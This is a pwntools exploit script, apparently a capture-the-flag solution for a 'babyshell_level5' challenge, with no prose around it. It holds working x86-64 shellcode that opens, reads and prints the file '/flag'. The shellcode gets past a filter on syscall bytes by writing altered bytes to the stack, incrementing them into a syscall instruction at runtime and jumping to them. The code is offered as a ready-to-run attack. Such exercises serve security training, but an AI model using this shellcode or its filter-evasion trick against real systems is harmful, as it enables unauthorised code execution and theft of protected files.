from pwn import *

context.update(arch="x86-64", encoding="latin")

p = process("/challenge/babyshell_level5")

shellcode = f'''
.global _start
_start:
.intel_syntax noprefix
        mov r10d, 0x67616c66
        shl r10, 8
        mov r10b, 0x2f
        push r10
        push rsp
        pop rdi

        xor esi, esi
        xor edx, edx
        mov al, 2
        lea r8, [rip+2]
        jmp syscall

        mov edi, eax
        push rsp
        pop rsi
        mov dl, 128
        xor eax, eax
        lea r8, [rip+2]
        jmp syscall

        mov dil, 1
        push rsp
        pop rsi
        mov al, 1
        lea r8, [rip+2]
        jmp syscall

        mov al, 60
        xor edx, edx
        lea r8, [rip+2]
        jmp syscall

syscall:
        lea r9, [rip+40]
        mov r10, 0x9090909090e1ff41
        push r10
        mov r10, 0x909090909090050e
        push r10
        inc QWORD PTR [rsp]
        jmp rsp
        .rept 40
            nop
        .endr
        jmp r8
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x1000 bytes from stdin.")
p.write(shellcode)
print(p.readall())
